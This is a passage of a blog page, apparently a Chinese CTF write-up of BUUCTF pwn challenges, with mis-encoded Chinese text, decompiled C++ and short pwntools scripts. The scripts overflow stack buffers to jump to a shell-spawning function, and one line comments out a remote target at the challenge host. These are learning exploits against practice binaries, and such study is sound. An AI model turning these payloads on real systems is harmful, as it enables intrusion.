<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="ã‚ãŒã„ãŸå¤¢ã‚’æ¨ã¦ã¦æºã‚Œã‚‹ä»Šæ—¥ã¯çœ ã£ã¦èª¤é­”åŒ–ã›" />
  
  
  <title>
    
      ã€CTF.0x00ã€‘BUUCTF/BUUOJ-Pwn WP 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">ã€CTF.0x00ã€‘BUUCTF/BUUOJ-Pwn WP</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
          2020-09-08 02:09:30
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                
                <span class="span--category">
                  <a href="/categories/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="ä¿¡æ¯å®‰å…¨">
                    <b>#</b> ä¿¡æ¯å®‰å…¨
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86/" title="å †">
                    <b>#</b> å †
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Use-After-Free/" title="Use After Free">
                    <b>#</b> Use After Free
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2libc/" title="ret2libc">
                    <b>#</b> ret2libc
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2text/" title="ret2text">
                    <b>#</b> ret2text
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ROP/" title="ROP">
                    <b>#</b> ROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="æ ˆæº¢å‡º">
                    <b>#</b> æ ˆæº¢å‡º
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2shellcode/" title="ret2shellcode">
                    <b>#</b> ret2shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/shellcode/" title="shellcode">
                    <b>#</b> shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" title="å †é£æ°´">
                    <b>#</b> å †é£æ°´
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" title="gotè¡¨åŠ«æŒ">
                    <b>#</b> gotè¡¨åŠ«æŒ
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="æ ˆè¿ç§»">
                    <b>#</b> æ ˆè¿ç§»
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/IO-FILE-hijack/" title="_IO_FILE hijack">
                    <b>#</b> _IO_FILE hijack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Fastbin-Attack/" title="Fastbin Attack">
                    <b>#</b> Fastbin Attack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/FSOP/" title="FSOP">
                    <b>#</b> FSOP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Heap-Overflow/" title="Heap Overflow">
                    <b>#</b> Heap Overflow
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Force/" title="House of Force">
                    <b>#</b> House of Force
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Orange/" title="House of Orange">
                    <b>#</b> House of Orange
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Spirit/" title="House of Spirit">
                    <b>#</b> House of Spirit
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/off-by-one/" title="off by one">
                    <b>#</b> off by one
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/one-gadget/" title="one_gadget">
                    <b>#</b> one_gadget
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/python/" title="python">
                    <b>#</b> python
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Unlink/" title="Unlink">
                    <b>#</b> Unlink
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Unsorted-bin-Attack/" title="Unsorted bin Attack">
                    <b>#</b> Unsorted bin Attack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/canary/" title="canary">
                    <b>#</b> canary
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Integer-Overflow/" title="Integer Overflow">
                    <b>#</b> Integer Overflow
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/off-by-null/" title="off by null">
                    <b>#</b> off by null
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2csu/" title="ret2csu">
                    <b>#</b> ret2csu
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/SROP/" title="SROP">
                    <b>#</b> SROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Stack-Smashing-Protect-leak/" title="Stack Smashing Protect leak">
                    <b>#</b> Stack Smashing Protect leak
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>åˆ·é¢˜é’ˆä¸æˆ³ï¼ˆ</p>
<span id="more"></span>

<h1 id="0x000-ç»ªè®º"><a href="#0x000-ç»ªè®º" class="headerlink" title="0x000.ç»ªè®º"></a>0x000.ç»ªè®º</h1><p><a href="buuoj.cn">BUUCTF</a>æ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜</p>
<p>æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆ<del>å“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦</del>ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆ<del>å¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD</del></p>
<blockquote>
<p>åŸæœ¬æ˜¯æ”¾åœ¨archiveç«™ç‚¹çš„ï¼Œä½†æ˜¯æƒ³æ¥æˆ‘åˆä¸æ˜¯ä»¥åéƒ½ä¸åœ¨BUUä¸Šåšé¢˜äº†ï¼Œæ‰€ä»¥å°±æ¬åˆ°ä¸»ç«™æ¥äº†XD</p>
<p>ç”±äºæ˜¯åˆ†æ—¶æœŸåšçš„ï¼Œç¬”è€…ç»å†äº†kaliä¸»åŠ›â†’manjaroä¸»åŠ›â†’ubuntuä¸»åŠ›çš„è¿‡ç¨‹ï¼Œå› æ­¤å¯èƒ½ä¸åŒçš„é¢˜çš„shellçš„ç”»é£ä¼šä¸å¤§ä¸€æ ·:)</p>
</blockquote>
<h1 id="0x001-0x010"><a href="#0x001-0x010" class="headerlink" title="0x001 ~ 0x010"></a>0x001 ~ 0x010</h1><h2 id="0x001-test-your-nc-nc"><a href="#0x001-test-your-nc-nc" class="headerlink" title="0x001.test your nc - nc"></a>0x001.test your nc - nc</h2><p>æ‹–å…¥IDAåˆ†æï¼Œå‘ç°ä¸€è¿è¡Œå°±èƒ½ç›´æ¥getshell</p>
<p><img src="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png" alt="image.png"></p>
<p>ncï¼ŒæˆåŠŸgetshellï¼Œå¾—flag</p>
<p><img src="https://i.loli.net/2020/08/15/5Ze2Nw94jmRxUJF.png" alt="image.png"></p>
<h2 id="0x002-rip-ret2text"><a href="#0x002-rip-ret2text" class="headerlink" title="0x002.rip - ret2text"></a>0x002.rip - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³</p>
<p><img src="https://i.loli.net/2020/08/14/HPO2siU8DpyfnYG.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä½¿ç”¨äº†getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œåç§»é‡ä¸º0xf+8ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/08/14/NxMSvtUf7wZ9iY4.png" alt="image.png"></p>
<p>å¯ä»¥å‘ç°ç›´æ¥å­˜åœ¨ä¸€ä¸ª<code>system(&quot;/bin/sh&quot;)</code>ï¼Œè¿”å›åˆ°è¿™é‡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/08/14/rhUu8p2mc6MyXsi.png" alt="image.png"></p>
<p>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rip&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26914)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>è¾“å…¥æˆ‘ä»¬çš„<code>payload</code>ï¼Œç›´æ¥getshellï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/08/14/7fGrIXzylhN49YM.png" alt="image.png"></p>
<h2 id="0x003-warmup-csaw-2016-ret2text"><a href="#0x003-warmup-csaw-2016-ret2text" class="headerlink" title="0x003.warmup_csaw_2016 - ret2text"></a>0x003.warmup_csaw_2016 - ret2text</h2><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p>
<p><img src="https://i.loli.net/2020/08/15/2Oy9SNjZuKEI75t.png" alt="image.png"></p>
<p>æ‹–å…¥IDAï¼Œå‘ç°å¯ä»¥æº¢å‡ºçš„<code>gets</code>å‡½æ•°ï¼Œåç§»é‡æ˜¯0x40+8ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/08/15/UcPklJTz8G5brHx.png" alt="image.png"></p>
<p>åˆå‘ç°ä¸€ä¸ªå¯ä»¥è·å¾—flagçš„gadget<code>system(&quot;cat flag.txt&quot;)</code>ï¼Œæ§åˆ¶ç¨‹åºè¿”å›åˆ°è¿™é‡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/08/15/KLPE8bTj2kWszU3.png" alt="image.png"></p>
<p>æ•…æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>* (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x400611</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./warm_up_2016&#x27;</span>)<span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28660)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥æˆ‘ä»¬çš„payloadï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/08/15/V6ZjsuOYfCUhMLJ.png" alt="image.png"></p>
<h2 id="0x004-pwn1-sctf-2016-ret2text"><a href="#0x004-pwn1-sctf-2016-ret2text" class="headerlink" title="0x004.pwn1_sctf_2016 - ret2text"></a>0x004.pwn1_sctf_2016 - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/07/NAUM59LC7FSuZ6V.png" alt="image.png"></p>
<p>æ‹–å…¥IDAçœ‹ä¸€ä¸‹ï¼Œ<del>ç„¶åä½ å°±ä¼šå‘ç°C++é€†å‘å‡ºæ¥çš„ä¸œè¥¿æ¯”**è¿˜**</del></p>
<p><img src="https://i.loli.net/2020/09/07/5FsRKWxZSiME8ug.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºreplaceå‡½æ•°æ˜¯åœ¨è¯¥ç¨‹åºä¸­çš„ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆè¿›å»ç®€å•çœ‹çœ‹ï¼š</p>
<p><img src="https://i.loli.net/2020/09/07/vwAz9J8tIlN5DpB.png" alt="image.png"></p>
<p>ç®€å•é€šè¯»ä¸€ä¸‹æˆ‘ä»¬å¤§æ¦‚çŸ¥é“è¿™æ®µä»£ç çš„è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼šï¼ˆ<del>ä¸å°±æ˜¯**ğŸæœ‰ä»€ä¹ˆè¯»ä¸æ‡‚çš„ï¼Œå¹²ä»–å°±å®Œäº‹äº†</del></p>
<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string *__stdcall <span class="title">replace</span><span class="params">(std::string *a1, std::string *a2, std::string *a3, std::string *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+1Bh] [ebp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+2Fh] [ebp-29h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+34h] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+38h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">                                                <span class="comment">// æ¥æ”¶å‚æ•°ä¸ºï¼šv6,input,v9,v7</span></span><br><span class="line">                                                <span class="comment">// å…¶ä¸­inputä¸ºæˆ‘ä»¬çš„è¾“å…¥ï¼Œv9ä¸ºå­—ç¬¦ä¸²&quot;I&quot;ï¼Œv7ä¸ºå­—ç¬¦ä¸²&quot;you&quot;</span></span><br><span class="line">                                                <span class="comment">// æŸ¥æ±‡ç¼–æºç å¯çŸ¥ä¸‹é¢çš„stringåŸºæœ¬éƒ½æ˜¯a2ï¼Œä¹Ÿå°±æ˜¯input</span></span><br><span class="line">  <span class="keyword">while</span> ( std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>) != <span class="number">-1</span> )  <span class="comment">// åœ¨inputä¸­å¯»æ‰¾å­—ç¬¦ä¸²v9ï¼ˆ&quot;I&quot;ï¼‰ï¼Œå¦‚æœæ‰¾ä¸åˆ°åˆ™findæ–¹æ³•ä¼šè¿”å›-1ï¼Œè·³å‡ºå¾ªç¯</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v10);      <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v10</span></span><br><span class="line">    v11 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// è·å¾—&quot;I&quot;å­—ç¬¦ä¸²åœ¨inputä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v12);                   <span class="comment">// input.begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v12</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v13);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v13</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v14);                   <span class="comment">// input.begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v14</span></span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(&amp;v9, v14, v13, &amp;v10);<span class="comment">// v14è¿­ä»£ç”Ÿæˆçš„å­—ç¬¦ä½¿ç”¨allocatorï¼ˆv10ï¼‰åˆ†é…å†…å­˜ã€ä½¿ç”¨operator+ï¼ˆv13ï¼‰æ¥æˆæ–°å­—ç¬¦ä¸²ç»™åˆ°v8</span></span><br><span class="line">                                                <span class="comment">// æŸ¥çœ‹æ±‡ç¼–å¯çŸ¥ç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸ºv11ï¼ˆå³ç”Ÿæˆçš„å­—ç¬¦ä¸²ä¸ºinputä¸­ç¬¬ä¸€ä¸ª&quot;I&quot;çš„å‰é¢æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v10, v4); <span class="comment">// ææ„v10</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v15);      <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v15</span></span><br><span class="line">    std::string::<span class="built_in">end</span>(&amp;v16);                     <span class="comment">// input.end()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v16</span></span><br><span class="line">    v17 = std::string::<span class="built_in">length</span>(a3);              <span class="comment">// è·å¾—&quot;I&quot;çš„é•¿åº¦ç»™åˆ°v17</span></span><br><span class="line">    v19 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// è·å¾—&quot;I&quot;å­—ç¬¦ä¸²åœ¨inputä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡ç»™åˆ°v19</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v20);                   <span class="comment">// begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v20</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v18);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v18</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v21);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v21</span></span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(&amp;v8, v21, v16, &amp;v15);<span class="comment">// v16è¿­ä»£ç”Ÿæˆçš„å­—ç¬¦ä½¿ç”¨allocatorï¼ˆv15ï¼‰åˆ†é…å†…å­˜ã€ä½¿ç”¨operator+ï¼ˆv21ï¼‰æ¥æˆæ–°å­—ç¬¦ä¸²ç»™åˆ°v8</span></span><br><span class="line">                                                <span class="comment">// æ³¨æ„åœ¨è¿™é‡Œå’Œå‰é¢çš„ç›¸ä¼¼è¯­å¥ä¸­å­—ç¬¦ä¸²è¿­ä»£å™¨ä¸operatoræ‰€ä¼ å…¥çš„ä½ç½®æ˜¯ç›¸åçš„</span></span><br><span class="line">                                                <span class="comment">// å¯èƒ½æ˜¯å› ä¸ºè¿­ä»£å™¨ä»åå¾€å‰ç”Ÿæˆå­—ç¬¦ä¸²ï¼Ÿ</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v15, v5); <span class="comment">// ææ„v15</span></span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;v23, &amp;v9, a4);<span class="comment">// v9+a4ç”Ÿæˆçš„å­—ç¬¦ä¸²ç»™åˆ°v23</span></span><br><span class="line">                                                <span class="comment">// å³inputä¸­ç¬¬ä¸€ä¸ª&quot;I&quot;ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²å†åŠ ä¸Š&quot;you&quot;ç”Ÿæˆæ–°å­—ç¬¦ä¸²v23</span></span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;v22, &amp;v23, &amp;v8);<span class="comment">// v23+v8ç”Ÿæˆçš„å­—ç¬¦ä¸²ç»™åˆ°v22</span></span><br><span class="line">                                                <span class="comment">// å³v23å†åŠ ä¸ŠåŸinputä¸­ç¬¬ä¸€ä¸ª&quot;I&quot;ä¹‹åçš„æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²ç”Ÿæˆæ–°å­—ç¬¦ä¸²v22</span></span><br><span class="line">    std::string::<span class="keyword">operator</span>=(a2, &amp;v22, v6);       <span class="comment">// v22ç»™å›åˆ°a2ï¼ˆä¹Ÿå°±æ˜¯input</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v22);                 <span class="comment">// ææ„v20</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v23);                 <span class="comment">// ææ„v21</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v8);                  <span class="comment">// ææ„v8</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v9);                  <span class="comment">// ææ„v9</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="built_in">string</span>(a1, a2);                  <span class="comment">// æ‹·è´inputåˆ°a1ï¼ˆvulnä¸­v6ï¼‰</span></span><br><span class="line">  <span class="keyword">return</span> 